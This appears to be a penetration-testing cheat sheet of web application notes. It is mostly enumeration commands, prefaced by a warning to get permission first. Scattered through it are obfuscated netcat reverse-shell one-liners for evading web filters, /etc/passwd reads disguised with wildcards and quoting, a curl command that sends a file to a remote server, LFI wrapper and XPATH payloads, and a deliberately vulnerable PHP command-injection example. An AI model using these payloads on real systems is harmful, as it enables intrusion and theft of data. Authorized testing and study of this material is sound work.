---
description: >-
  TODO: Need to pull web notes out of the OS Agnostic section (and then rename
  that to something better!)
---

# Web Notes

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## Web Application Enumeration

[w3af](http://w3af.org/) is an open source python-based Web Application Attack and Audit Framework. 

> The project’s goal is to create a framework to help you secure your web applications by finding and exploiting all web application vulnerabilities.

It can also be abused by attackers to find and enumerate weaknesses in web applications and can be downloaded and run with the following commands:

```bash
git clone --depth 1 https://github.com/andresriancho/w3af.git
    cd w3af
    ./w3af_gui
```

## Payloads and Bypass Methods for Web Filtering

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings" caption="swisskyrepo / PayloadsAllTheThings" %}

{% embed url="https://www.secjuice.com/php-rce-bypass-filters-sanitization-waf/" caption="How To Exploit PHP Remotely To Bypass Filters & WAF Rules" %}

### Use Uninitialized Shell Variables to Bypass Filters

{% embed url="https://www.secjuice.com/web-application-firewall-waf-evasion/" caption="Web Application Firewall \(WAF\) Evasion Techniques \#3" %}

Uninitialized shell variables can be used for bypassing web application firewalls \(WAF\).  Example: bypassing a filter to execute a reverse shell - `nc$u -e /bin$u/bash$u <ip> <port>`.  If this doesn't work try adding spaces before and after the variable \(note the `+`'s, this example is also URL encoded\): `nc+$u++-e+/bin$u/bash$u <ip> <port>` _\(`$u` in this case is a random attacker-picked variable that would hopefully be uninitialized on the target\)._

### Use Wildcards to Bypass Filters

{% embed url="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" caption="Web Application Firewall \(WAF\) Evasion Techniques" %}

Bypass web filters by using bash wildcards:`/???/?s` `/?cmd=%2f???%2f??t%20%2f???%2fp??s??` will bypass...and execute every command that matches. such as `/bin/cat /etc/apt`, and `/bin/cat /etc/passwd`

netcat firewall bypass: `/???/n? -e /???/b??h 2130706433 1337` \(`/???/?c.??????????? -e /???/b??h 2130706433 1337` for nc traditional\)

```text
Standard: /bin/nc 127.0.0.1 1337
Evasion:/???/n? 2130706433 1337
Used chars: / ? n [0-9]

Standard: /bin/cat /etc/passwd
Evasion: /???/??t /???/??ss??
Used chars: / ? t s
```

### Use String Concatenation to Bypass Filters

```text
$ /bin/cat /etc/passwd
$ /bin/cat /e'tc'/pa'ss'wd
$ /bin/c'at' /e'tc'/pa'ss'wd
$ /b'i'n/c'a't /e't'c/p'a's's'w'd'
Can use \\ instead of ' as well
```

### Convert IP Address to Decimal Format 

It is still understood by most programs and languages, and avoids `.` character in filtered HTTP requests: `127.0.0.1 = 2130706433`

### LFI / RFI by Bypassing Filters Using Wrappers

From [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/73aa26ba6891981ec2254907b9bbd4afdc745e1d/File%20Inclusion/README.md#lfi--rfi-using-wrappers)   `php://filter/` has multiple ways to bypass PHP input filters ;These can be chained with `|` or `/` : zip, data, expect, input, phar; many more different wrappers to try!

```php
/zlib.deflate/read=string.rot13/convert.base64-encode/convert.iconv.utf-8.utf-16/resource=<resource to get>
```

## Command Injection

{% embed url="https://owasp.org/www-community/attacks/Command\_Injection" %}

### PHP Command Injection

The following PHP code snippet is vulnerable to a command injection attack:

```php
<?php
print("Please specify the name of the file to delete");
print("<p>");
$file=$_GET['filename'];
system("rm $file");
?>
```

The following request is an example of that will successful attack on the previous PHP code, and will output the results of the `id` command: `http://127.0.0.1/delete.php?filename=bob.txt;id`.  Look for exposed `$_GET['filename']` type variables that take input from the user, or can be injected into from the URL.  This combined with `system("<command>")` will allow for command injection.

Local File Inclusion \(LFI\) / Remote File Inclusion \(RFI\)

Common and/or useful files to check for when exploiting Local File Inclusion \(for both Linux and Windows\): [https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)

## Misc

### XPATH Dump

```text
https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
```

### LFI - Retrieve HTML/PHP files without executing

```text
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

whatismybrowser.com - research User-Agent strings

Injecting IPs when `.` is disallowed: convert dotted-decimal format to decimal value - [`ip2dh`](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)

Use `curl` to exfiltrate file on remote server \(from attackers box\): `curl -d @/<file> <remote server>`

in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

vulnerability testing for webdav \(or other file upload vulns!\): `davtest`

bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`

pull Google cached webpage if regular site not loading: `cache:https://<somewebsite>`

Virtual Host Routing: substitute IP for hostname to get different results

### gobuster

```bash
gobuster -u $url -w $wordlist -l -x php -t 20
[-l include length, -x append .php to searches, -t threads]
```

hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](https://www.youtube.com/watch?v=TJVghYBByIA)

web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)

Web site "flyover" surveillance: [Aquatone](https://github.com/michenriksen/aquatone) "is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface" - from the author \(see link\). Visual dirbuster?

### Crawl web pages for keywords - useful for password/vhost enumeration lists

```bash
cewl
```

## HTTP Enumeration

* Search for folders with gobuster:

```text
gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
```

* OWasp DirBuster - Http folder enumeration - can take a dictionary file
* Dirb - Directory brute force finding using a dictionary file

```text
dirb http://$ip/ wordlist.dict

dirb <<http://vm/>>
```

* Dirb against a proxy

```text
dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129
```

* Nikto

```text
nikto -h $ip
```

* Nmap HTTP Enumeration

```text
nmap --script=http-enum -p80 -n $ip/24
```

* Nmap Check the server methods

```text
nmap --script http-methods --script-args http-methods.url-path='/test' $ip
```

* Get Options available from web server

```text
  curl -vX OPTIONS vm/test
```

* Uniscan directory finder:

```text
uniscan -qweds -u <<http://vm/>>
```

* Wfuzz - The web brute forcer

```text
wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test

wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ

wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"

wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ
```

* Recurse level 3

```text
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ
```

* Open a service using a port knock \(Secured with Knockd\)

```text
for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 -max-retries 0 -p $x server_ip_address; done
```

* WordPress Scan - Wordpress security scanner

```text
wpscan --url $ip/blog --proxy $ip:3129
```

* RSH Enumeration - Unencrypted file transfer system

```text
auxiliary/scanner/rservices/rsh_login
```

* Finger Enumeration

```text
finger @$ip

finger batman@$ip
```

* TLS & SSL Testing

```text
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html
```

* Proxy Enumeration \(useful for open proxies\)

```text
nikto -useproxy http://$ip:3128 -h $ip
```

## OpenVAS Vulnerability Scanner

```text
apt-get update

apt-get install openvas

openvas-setup

netstat -tulpn

Login at: https://$ip:939
```

